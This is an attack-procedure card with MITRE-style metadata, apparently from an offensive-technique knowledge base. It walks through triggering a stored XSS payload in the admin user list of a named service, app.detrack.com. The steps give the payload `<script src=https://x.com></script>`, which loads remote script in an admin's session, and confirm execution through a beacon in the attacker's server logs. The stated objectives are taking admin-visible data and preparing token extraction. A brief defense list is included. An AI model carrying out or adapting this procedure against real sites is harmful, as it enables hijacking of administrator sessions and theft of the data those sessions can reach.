---
id: proc-uuid-002
name: Trigger-XSS-Execution-via-Admin-View
tags:
  - xss
  - execution
  - admin-trigger
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:44.284Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-XSS-Execution-via-Admin-View

## Summary

This procedure triggers the execution of the stored XSS payload by having an admin view the user list on app.detrack.com, where the unsanitized name field renders the script in the admin's browser context.

## Description

Once the payload is stored from account creation, accessing the admin dashboard at https://app.detrack.com/a/ causes the user list to display the injected name without proper escaping, leading to JavaScript execution. This runs in the admin's high-privilege session, allowing access to sensitive data visible to admins. The attack relies on the admin navigating to the page, potentially via social engineering or natural workflow.

## Requirements

1. Admin credentials or access to app.detrack.com
2. Previously injected payload in the system
3. Browser developer tools to observe execution

## Defense

Defensive measures and detection strategies:

- Apply content security policy (CSP) to block inline or external scripts
- Sanitize all outputs in admin interfaces
- Log and alert on script execution attempts in web logs

## Objectives

1. Execute payload in admin context
2. Gain access to admin-visible data
3. Prepare for token extraction

## Instructions

### Step 1: Access Admin Dashboard

**Context**: Log in as admin and navigate to the vulnerable page.

Use browser to visit https://app.detrack.com/a/ after logging in.

> Ensure the injected user appears in the list.

### Step 2: Render User List

**Context**: The page load will automatically reflect and execute the payload.

No additional action; the name field in the table triggers `<script src=https://x.com></script>`.

> Observe network tab for request to x.com or console for errors/alerts.

### Step 3: Confirm Execution

**Context**: Verify script ran by checking external server logs.

Monitor your domain's access logs for the script load from the admin's IP.

> Success if beacon received, indicating execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- execution
